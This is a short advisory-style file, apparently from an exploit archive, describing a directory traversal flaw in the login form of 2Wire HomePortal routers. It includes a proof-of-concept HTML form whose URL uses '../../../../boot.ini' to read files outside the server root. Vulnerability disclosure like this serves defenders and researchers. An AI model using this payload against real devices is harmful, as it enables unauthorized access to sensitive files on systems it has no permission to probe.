@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/9463/info
+
+It has been reported that the software is allegedly prone to a directory traversal vulnerability that may allow a remote attacker to access information outside the server root directory. This issue is reported to exist in the 'wralogin' authentication form that is accessed through the HTTPS (SSL) interface.
+
+Successful exploitation of this vulnerability may allow a remote attacker to gain access to sensitive information that may be used to launch further attacks against a vulnerable system. 
+
+All versions of 2Wire HomePortal Series have been reported to be vulnerable to this issue.
+
+<form name="wralogin" method="get"
+action="http://www.example.com/wra/public/wralogin/?error=61&return=password/../../../../boot.ini">
+<input type="hidden" name="authcode" value="MUQmqC/sBiXfslfYEooIJg==">
+<center>
+<input type="password" name="password" value="">
+<input type="submit" alt="Submit" width="58" height="19" border="0"></td>
+</form>
+</body>
+</html>
